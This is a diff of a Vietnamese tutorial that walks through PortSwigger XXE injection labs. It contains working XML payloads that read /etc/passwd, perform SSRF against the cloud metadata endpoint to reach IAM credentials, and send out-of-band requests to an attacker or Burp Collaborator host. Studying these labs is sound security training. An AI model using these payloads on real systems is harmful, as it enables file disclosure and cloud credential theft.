@@ -61,13 +61,13 @@ Trong một vài trường hợp cuộc tấn công XXE có thể leo th
 Các loại hình tấn công XXE:
 - Exploiting XXE to retrieve files
 - Exploiting XXE to perform SSRF attacks
-- Exploiting blind XXE exfiltrate data out-of-band
-- Exploiting blind XXE to retrieve data via error messages
+- Exploiting blind XXE 
 
 ## 4. Exploiting XXE to retrieve files
 Dạng tấn công này ta sẽ dùng XXE để đọc 1 file bất kỳ của sever
 
 Ví dụ : Lab1 XXE injection portswigger
+
 Lab cho ta một trang web check số lượng của một mặt hàng nào đó. Khi chọn 1 mặt hàng và check số lượng, ta bắt được request là một tài liệu XML
 
 ![lab1](./img/lab1-exem.png)
@@ -76,11 +76,76 @@ Ta tiến hành XXE bằng payload sau:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<stockCheck><productId>1
-&xxe;
-</productId><storeId>1</storeId></stockCheck>
+<stockCheck>
+  <productId>
+    1
+    &xxe;
+  </productId>
+  <storeId>1</storeId>
+</stockCheck>
 ```
 Dòng ``<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`` để đọc file /etc/passwd và dùng ``&xxe;`` để xuất nội dung file ra respone\
 Kết quả:
 
 ![lab1](./img/lab1-reuslt.png)
+
+## 5. Exploiting XXE to perform SSRF attacks
+Dạng tấn công này sẽ lợi dụng XXE để tạo request đến website khác bên ngoài, thực hiện tấn công SSRF. Các thông tin nhạy cảm của sever có thể được gửi đi qua website của attacker
+
+Ta dùng câu khai báo sau để thực hiện request tới website khác bên ngoài:
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker-website.com"> ]>
+```
+
+Ví dụ : Lab2 XXE injection portswigger
+
+Ở lab này vẫn là trang check số lượng hàng, nhưng web yêu cầu ta gửi request đến ``http://169.254.169.254/`` và sẽ nhận về dữ liệu về các instance
+
+Đề bài ở lab2 này giống với lab1 nhưng chỉ thay đổi cách tấn công nên em sẽ chỉ nêu payload:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+  <stockCheck>
+    <productId>
+      1
+      &xxe;
+    </productId>
+    <storeId>1</storeId>
+  </stockCheck>
+```
+Khi gửi payload này thì ta nhận được instance tiếp theo là ``lastest``
+
+![lab2](./img/lab2-lastest.png)
+
+Ta thêm ``/latest`` vào url và tiếp tục gửi payload. Cứ thế ta được đường dẫn đến ``SecretAccessKey`` như sau ``http://169.254.169.254/latest/meta-data/iam/security-credentials/admin``
+
+## 6. Exploiting blind XXE
+Tương tự như blind SQLi thì blind XXE xảy ra khi ứng dụng không trả về bất kỳ respone nào cho ta khi thực hiện XXE injection. Trong bài này em sẽ đề cập đến 2 kỹ thuật để thực hiện tấn công blind XXE là **blind XXE out-of-band** và **blind XXE eror message**
+### A. Blind XXE out-of-band
+Đây là kỹ thuật mà ta sẽ inject payload sao cho target gửi request đến web mà ta kiểm soát. Cách triển khai thì tương tự như ``XXE SSRF attack``
+
+Ví dụ : Lab3 XXE injection portswigger
+
+Lab này vẫn là 1 trang check stock, và yêu cầu của nó là thực hiện XML sao cho labs phải gửi request đến Burp Collaborator của mình\
+Ta dùng dòng sau để inject:
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
+```
+> Trong đó ``BURP-COLLABORATOR-SUBDOMAIN`` là domain của Burp Collaborator của mỗi người
+
+Payload:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://2jmqyw22mlhogzkifmin6pp0ur0io7.oastify.com"> ]>
+  <stockCheck>
+    <productId>
+      &xxe;
+    </productId>
+    <storeId>1</storeId>
+  </stockCheck>
+```
+Khi inject thành công thì Burp Collborator sẽ bắt được request:
+
+![lab3](./img/lab3.png)
+
+
